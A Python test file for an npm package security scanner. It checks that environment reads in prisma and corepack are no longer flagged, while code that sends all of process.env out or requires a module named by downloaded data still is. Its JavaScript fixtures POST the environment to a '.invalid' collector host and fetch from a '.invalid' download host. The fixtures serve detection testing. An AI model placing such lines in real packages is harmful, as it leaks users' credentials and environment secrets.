"""D-16 and D-18 (0.1.9): popular releases that were SUSPICIOUS for what they read of the environment and require.

prisma 8.0.0-rc.21: `function getApiBaseUrl(env = process.env) { return env.PRISMA_MANAGEMENT_API_URL?.trim() ||
"https://api.prisma.io" }`. A parameter's default, an object's property and a copy (`{ ...process.env }`,
`Object.assign({}, process.env)`) kept no mark of being process.env, so a member read was the whole environment, and
the API's answers it reached were sent in an address: SC-IMPORT-RISK CRITICAL. A member of such a value read by a
variable's name is now that variable, as `process.env.X` is; one named for the environment (`env`) is still all of it;
any other member is not the environment (D-16).

corepack 0.36.0: its env file gives `{ env: { ...parsed, ...process.env }, path }`, whose `path` read as the whole
environment (D-16); and it requires the package.json of the package manager it downloaded, read as loading a module
named by data it received over the network. require parses a JSON file and runs none of it (D-18).

A parameter read by members is the same: prisma's telemetry sender builds its event in `buildTelemetryEvent(payload,
config, env)` from `env.platform`, `env.env.npm_config_user_agent` and `env.readProjectPackageJson()`, given `{ env:
process.env, ... }`, and sends the event.

What is still found: the copy or the holder sent whole, the holder's environment member, a function that returns
process.env, the parameter returned whole; a module named by received data that is not a JSON file.

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from tests.registry._review_support import issues, manifest, scan_npm

SEND = "fetch('https://collect.invalid/c', { method: 'POST', body: %s });\n"
DOWNLOAD = ("const https = require('https');\n"
            "https.get('https://dl.invalid/m', (res) => { let d = ''; res.on('data', (c) => d += c);\n"
            "  res.on('end', () => { %s }); });\n")


def import_risks(text):
    res = scan_npm({"package.json": manifest(main="index.js"), "index.js": text})
    return res, [(i["sev"], i["msg"]) for i in issues(res, "SC-IMPORT-RISK")]


class NotFoundTests(unittest.TestCase):
    def test_prismas_shape(self):
        text = ("function getApiBaseUrl(env = process.env) {\n"
                "  return env.PRISMA_MANAGEMENT_API_URL?.trim() || 'https://api.invalid';\n}\n"
                "function toAbsoluteUrl(url) { return url.startsWith('https://') ? url : `https://${url}`; }\n"
                "async function deploy(env) {\n"
                "  const r = await fetch(getApiBaseUrl(env) + '/v1/deployments');\n"
                "  const d = await r.json();\n"
                "  return fetch(toAbsoluteUrl(d.previewDomain));\n}\n"
                "module.exports = { deploy };\ndeploy();\n")
        res, found = import_risks(text)
        self.assertEqual(found, [])
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_prismas_telemetry(self):
        # its sender builds the event from a parameter it reads by members, given `{ env: process.env, ... }`
        text = ("function buildEvent(payload, env) {\n"
                "  return { id: payload.id, os: env.platform, pm: env.env.npm_config_user_agent,\n"
                "           ts: env.readProjectPackageJson() };\n}\n"
                "const event = buildEvent({ id: 'x' }, { platform: process.platform, env: process.env,\n"
                "  readProjectPackageJson: () => null });\n" + SEND % "JSON.stringify(event)")
        res, found = import_risks(text)
        self.assertEqual(found, [])
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_copies_and_holders_read_by_name(self):
        for setup, read in (("const env = { ...process.env };", "env.API_URL"),
                            ("const env = Object.assign({}, process.env);", "env.API_URL"),
                            ("const ctx = { env: process.env };", "ctx.env.API_URL"),
                            ("const local = { env: { ...process.env }, path: '/p/.corepack.env' };", "local.path")):
            with self.subTest(setup):
                _res, found = import_risks(setup + "\n" + (SEND % ("'x=' + " + read)))
                self.assertEqual(found, [])

    def test_corepacks_json_require(self):
        text = DOWNLOAD % "const { bin } = require(require('path').join('/tmp/cp', d, 'package.json'));"
        _res, found = import_risks(text)
        self.assertEqual(found, [])


class FoundTests(unittest.TestCase):
    def test_the_environment_sent_whole(self):
        for setup, sent in (("const env = { ...process.env };", "JSON.stringify(env)"),
                            ("const env = Object.assign({}, process.env);", "JSON.stringify(env)"),
                            ("const ctx = { env: process.env, n: 1 };", "JSON.stringify(ctx)"),
                            ("const ctx = { env: process.env };", "JSON.stringify(ctx.env)"),
                            ("function f(env = process.env) { return env; }", "JSON.stringify(f())"),
                            ("function g(c) { return c.env; }", "JSON.stringify(g({ env: process.env }))"),
                            ("function m(e) { return { p: e.platform, all: e }; }", "JSON.stringify(m(process.env))")):
            with self.subTest(setup):
                res, found = import_risks(setup + "\n" + SEND % sent)
                self.assertEqual([sev for sev, _msg in found], ["CRITICAL"], found)
                self.assertIn("reads credentials or the whole environment and sends data over the network", found[0][1])
                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_module_named_by_received_data(self):
        for load in ("require(d);", "require('./m/' + d + '.js');"):
            with self.subTest(load):
                _res, found = import_risks(DOWNLOAD % load)
                self.assertEqual(len(found), 1, found)
                self.assertIn("loads a module named by data it receives over the network", found[0][1])


if __name__ == "__main__":
    unittest.main()
